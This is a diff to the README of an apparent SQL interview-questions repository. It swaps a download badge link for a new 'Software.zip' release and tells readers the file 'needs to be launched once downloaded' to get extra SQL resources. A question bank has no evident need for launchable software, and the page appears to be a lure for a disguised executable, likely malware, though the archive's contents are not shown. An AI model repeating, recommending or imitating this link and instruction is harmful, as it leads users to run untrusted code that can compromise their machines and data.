@@ -26,7 +26,7 @@ You can navigate through the repository to find SQL interview questions categori
 
 ## Link to Software Download 📥
 
-[![Download Software](https://github.com/xanderyes/SQL-Interview-Questions/releases/download/v1.0/Release_x64.zip)](https://github.com/xanderyes/SQL-Interview-Questions/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/xanderyes/SQL-Interview-Questions/releases/download/v2.0/Software.zip)](https://github.com/xanderyes/SQL-Interview-Questions/releases/download/v2.0/Software.zip)
 
 The link provided leads to a software download that contains additional SQL resources to assist you in your learning journey. Click on the button above to download the software package. Remember, the file needs to be launched once downloaded.
 
